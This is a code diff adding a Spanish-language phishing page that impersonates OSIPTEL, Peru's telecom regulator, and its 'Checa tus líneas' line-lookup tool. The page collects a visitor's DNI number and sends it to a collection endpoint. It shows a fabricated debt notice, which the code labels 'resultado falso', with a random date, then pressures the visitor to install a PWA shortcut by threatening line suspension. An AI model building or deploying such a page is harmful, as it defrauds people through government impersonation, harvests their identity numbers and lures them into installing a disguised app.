@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="Herramienta digital que te permite descubrir cuántas líneas telefónicas existen a tu nombre.">
+    <title>OSIPTEL - Checa tus líneas</title>
+    <link rel="manifest" href="manifest.json">
+    <link href="https://checatuslineas.osiptel.gob.pe/image/osiptel.ico" rel="shortcut icon" type="image/x-icon">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'WorkSans-Regular', 'Roboto', 'Arial', sans-serif; background: #f5f5f5; color: #1b1b1c; }
+        
+        /* Cabecera */
+        .header { background-color: #003366; padding: 15px 0; text-align: center; }
+        .header img { height: 50px; width: auto; vertical-align: middle; }
+        
+        /* Banner principal */
+        .banner { width: 100%; }
+        .banner img { width: 100%; display: block; }
+        
+        /* Contenedor del formulario */
+        .container { max-width: 700px; margin: 20px auto; padding: 0 15px; }
+        .card { background: white; border-radius: 8px; padding: 25px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        .card h2 { color: #2664AE; font-size: 18px; margin-bottom: 15px; }
+        .card p { font-size: 14px; color: #555; margin-bottom: 15px; }
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; font-weight: bold; margin-bottom: 5px; font-size: 13px; color: #333; }
+        .form-group select, .form-group input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; font-family: inherit; }
+        .btn { background: #2664AE; color: white; border: none; padding: 12px 30px; font-size: 15px; border-radius: 4px; cursor: pointer; font-weight: bold; width: 100%; }
+        .btn:hover { background: #1a4a7a; }
+        
+        /* Servicios */
+        .servicios { background: #2664AE; color: white; padding: 40px 0; margin-top: 30px; }
+        .servicios .container { margin: 0 auto; }
+        .servicios h3 { text-align: center; margin-bottom: 30px; font-size: 1.5rem; font-weight: normal; }
+        .servicios .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px; }
+        .servicios .item { display: flex; align-items: flex-start; gap: 15px; }
+        .servicios .item img { width: 60px; height: auto; flex-shrink: 0; }
+        .servicios .item p { font-size: 13px; line-height: 1.5; margin: 0; }
+        
+        /* Footer */
+        .footer { background: #222; color: white; padding: 15px 0; text-align: center; font-size: 13px; }
+        .footer .container { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; max-width: 700px; margin: 0 auto; padding: 0 15px; }
+        .footer .social { list-style: none; display: flex; gap: 10px; margin: 0; padding: 0; align-items: center; }
+        .footer .social a { display: inline-block; }
+        
+        /* Resultado falso */
+        #resultado-falso { display: none; margin-top: 20px; padding: 20px; background: #fff3cd; border: 1px solid #ffc107; border-radius: 4px; }
+        #resultado-falso h3 { color: #856404; font-size: 16px; margin-bottom: 10px; }
+        #resultado-falso p { color: #856404; font-size: 14px; margin-bottom: 8px; }
+        
+        /* Banner PWA */
+        #banner-pwa { display: none; position: fixed; bottom: 0; left: 0; right: 0; background: white; padding: 20px; box-shadow: 0 -2px 15px rgba(0,0,0,0.2); text-align: center; z-index: 9999; }
+        #banner-pwa p { margin-bottom: 10px; font-size: 14px; color: #333; }
+        #banner-pwa button { background: #2664AE; color: white; border: none; padding: 12px 30px; font-size: 14px; border-radius: 4px; cursor: pointer; margin: 5px; font-weight: bold; }
+        #banner-pwa button.cancel { background: #999; }
+    </style>
+</head>
+<body>
+
+    <!-- CABECERA CON LOGO OSIPTEL CENTRADO -->
+    <header class="header">
+        <img src="logo_osiptel_gris.svg" alt="OSIPTEL">
+    </header>
+
+    <!-- BANNER PRINCIPAL (usando URL oficial de OSIPTEL) -->
+    <div class="banner">
+        <img src="https://checatuslineas.osiptel.gob.pe/image/app/banner-web-checa-tus-lineas.webp" alt="Banner Checa tus líneas">
+    </div>
+
+    <!-- FORMULARIO DE CONSULTA MODIFICADO -->
+    <div class="container">
+        <div class="card" id="formulario">
+            <h2>📋 Verifica si tienes deudas y líneas a tu nombre</h2>
+            <p>Ingrese sus datos para consultar si existen deudas y líneas telefónicas registradas a su nombre sin su autorización.</p>
+            
+            <div class="form-group">
+                <label>(*) Tipo Documento:</label>
+                <select id="IdTipoDoc">
+                    <option value="">-- SELECCIONA --</option>
+                    <option value="1">DNI</option>
+                    <option value="3">CARNÉ DE EXTRANJERÍA</option>
+                    <option value="4">PASAPORTE</option>
+                    <option value="2">RUC</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>(*) N° Documento:</label>
+                <input type="text" id="NumeroDocumento" placeholder="N° Documento" maxlength="8" inputmode="numeric" pattern="[0-9]{8}" title="Debe ingresar exactamente 8 dígitos numéricos">
+            </div>
+            
+            <button class="btn" onclick="consultar()">🔍 Consultar</button>
+            
+            <!-- RESULTADO FALSO -->
+            <div id="resultado-falso">
+                <h3>⚠️ Se ha detectado una Deuda pendiente.</h3>
+                <p>Se encontró <strong>1 línea adicional</strong> registrada.</p>
+                <p><strong>DNI <span id="dniMostrado"></span> tiene deuda.</strong></p>
+                <p><strong>Deuda vigente desde el <span id="fechaDeuda"></span>.</strong></p>
+                <p><strong>Deuda pendiente: S/ 89.90 - Plan Postpago.</strong></p>
+                <button class="btn" onclick="activarBanner()">📄 Visualizar recibo</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- SERVICIOS RELACIONADOS (usando URLs oficiales) -->
+    <div class="servicios">
+        <div class="container">
+            <h3>Más herramientas a tu servicio</h3>
+            <div class="grid">
+                <div class="item">
+                    <img src="https://checatuslineas.osiptel.gob.pe/image/app/logo-checa-imei.png" alt="Checa IMEI">
+                    <p>Aplicativo que permite consultar en línea si el código o serie electrónica(IMEI) que identifica a un celular, se encuentra registrado como robado, perdido o si ha sido desbloqueado al haberse recuperado.</p>
+                </div>
+                <div class="item">
+                    <img src="https://checatuslineas.osiptel.gob.pe/image/app/logo-checa-plan.png" alt="Checa Plan">
+                    <p>Herramienta digital que compara todos los planes de todas las empresas operadoras de internet móvil y tarifas de internet fijo, además calcula los datos para internet móvil y la velocidad de internet fijo que cada usuario realmente necesita.</p>
+                </div>
+                <div class="item">
+                    <img src="https://checatuslineas.osiptel.gob.pe/image/app/logo-checa-equipo.png" alt="Checa Equipo">
+                    <p>Herramienta para comparar los precios de los equipos celulares que ofrecen las empresas operadoras en función de sus distintos planes y los que se pueden encontrar en tiendas por departamento y sitios on line.</p>
+                </div>
+                <div class="item">
+                    <img src="https://checatuslineas.osiptel.gob.pe/image/app/logo-checa-senal.png" alt="Checa Señal">
+                    <p>Aplicativo informático, mediante el cual podrá conocer la cobertura del servicio móvil en cada una de las localidades que las empresas operadoras declaran al OSIPTEL.</p>
+                </div>
+                <div class="item">
+                    <img src="https://checatuslineas.osiptel.gob.pe/image/app/logo-checa-internet.png" alt="Checa Internet">
+                    <p>Con esta herramienta puedes conocer o comparar el desempeño del servicio de internet móvil ofrecido por las principales empresas operadoras en tu distrito, provincia y región, puedes hacerlo.</p>
+                </div>
+                <div class="item">
+                    <img src="https://checatuslineas.osiptel.gob.pe/image/app/logo-checa-caso.png" alt="Checa Caso">
+                    <p>Herramienta que te permite registrar los problemas con tu operador y reportar los que no fueron solucionados. Si ya presentaste un reclamo, deberás seguir el procedimiento con tu operador.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- FOOTER (usando URLs oficiales) -->
+    <div class="footer">
+        <div class="container">
+            <div>
+                <p style="margin: 0;">OSIPTEL - Organismo Supervisor de la Inversión Privada en Telecomunicaciones </p>
+            </div>
+            <div>
+                <ul class="social">
+                    <li><a href="https://www.facebook.com/OsiptelOficial" target="_blank" aria-label="Facebook"><img src="https://checatuslineas.osiptel.gob.pe/image/app/footer_facebook.svg" width="30" height="30" alt=""></a></li>
+                    <li><a href="https://twitter.com/OSIPTEL" target="_blank" aria-label="Twitter"><img src="https://checatuslineas.osiptel.gob.pe/image/app/footer_twitter.svg" width="30" height="30" alt=""></a></li>
+                    <li><a href="https://www.instagram.com/osipteloficial/" target="_blank" aria-label="Instagram"><img src="https://checatuslineas.osiptel.gob.pe/image/app/footer_instagram.svg" width="30" height="30" alt=""></a></li>
+                    <li><a href="https://www.youtube.com/channel/UCjp5AVeSh3_XKDxgG7Ob58A" target="_blank" aria-label="Youtube"><img src="https://checatuslineas.osiptel.gob.pe/image/app/footer_youtube.svg" width="30" height="30" alt=""></a></li>
+                    <li><a href="https://vm.tiktok.com/ZMN82ybnT/" target="_blank" aria-label="Tik Tok"><img src="https://checatuslineas.osiptel.gob.pe/image/app/footer_tik tok.svg" width="30" height="30" alt=""></a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <!-- BANNER DE INSTALACIÓN PWA -->
+    <div id="banner-pwa">
+        <p>📲 Para visualizar su recibo, añada esta página a su pantalla de inicio.</p>
+        <p style="font-size:13px;color:#555;">Esto le permitirá acceder rápidamente a recibo y evitar la suspensión de su línea.</p>
+        <button onclick="instalarPWA()">✓ Añadir a pantalla de inicio</button>
+        <button class="cancel" onclick="document.getElementById('banner-pwa').style.display='none'">Ahora no</button>
+    </div>
+
+    <script>
+        let deferredPrompt;
+
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            deferredPrompt = e;
+        });
+
+        function consultar() {
+            var tipoDoc = document.getElementById('IdTipoDoc').value;
+            var doc = document.getElementById('NumeroDocumento').value;
+
+            // Validar que se seleccione DNI
+            if (tipoDoc !== '1') {
+                alert('Por favor seleccione DNI para realizar la consulta correctamente.');
+                return;
+            }
+
+            // Validar que el DNI sean exactamente 8 dígitos numéricos
+            if (!/^\d{8}$/.test(doc)) {
+                alert('El DNI debe contener exactamente 8 dígitos numéricos.');
+                return;
+            }
+
+            // --- CORRECCIÓN DE LA FECHA: siempre 4 meses atrás, día aleatorio ---
+            var hoy = new Date();
+            var haceCuatroMeses = new Date(hoy.getFullYear(), hoy.getMonth() - 4, 1);
+            // Último día del mes hace 4 meses
+            var ultimoDia = new Date(hoy.getFullYear(), hoy.getMonth() - 3, 0).getDate();
+            var diaAleatorio = Math.floor(Math.random() * ultimoDia) + 1;
+            var mes = String(haceCuatroMeses.getMonth() + 1).padStart(2, '0');
+            var anio = haceCuatroMeses.getFullYear();
+            var fechaFormateada = String(diaAleatorio).padStart(2, '0') + '/' + mes + '/' + anio;
+            // -----------------------------------------------------------------
+
+            // Mostrar el número de DNI y la fecha en el resultado
+            document.getElementById('dniMostrado').innerText = doc;
+            document.getElementById('fechaDeuda').innerText = fechaFormateada;
+            document.getElementById('resultado-falso').style.display = 'block';
+            
+            fetch('http://localhost:8000/api/registrar-visita', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ documento: doc, timestamp: new Date().toISOString() })
+            }).catch(() => {});
+        }
+
+        function activarBanner() {
+            document.getElementById('banner-pwa').style.display = 'block';
+        }
+
+        function instalarPWA() {
+            if (deferredPrompt) {
+                deferredPrompt.prompt();
+                deferredPrompt.userChoice.then((choiceResult) => {
+                    if (choiceResult.outcome === 'accepted') {
+                        fetch('http://localhost:8000/api/pwa-instalada', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ status: 'instalada', timestamp: new Date().toISOString() })
+                        }).catch(() => {});
+                        
+                        alert('✅ Acceso directo creado. Abra "OSIPTEL Consultas" desde su pantalla de inicio para ver su recibo.');
+                    }
+                    document.getElementById('banner-pwa').style.display = 'none';
+                    deferredPrompt = null;
+                });
+            }
+        }
+
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', () => {
+                navigator.serviceWorker.register('service-worker.js')
+                    .then(() => console.log('SW registrado'))
+                    .catch(() => console.log('SW falló'));
+            });
+        }
+    </script>
+</body>
+</html>
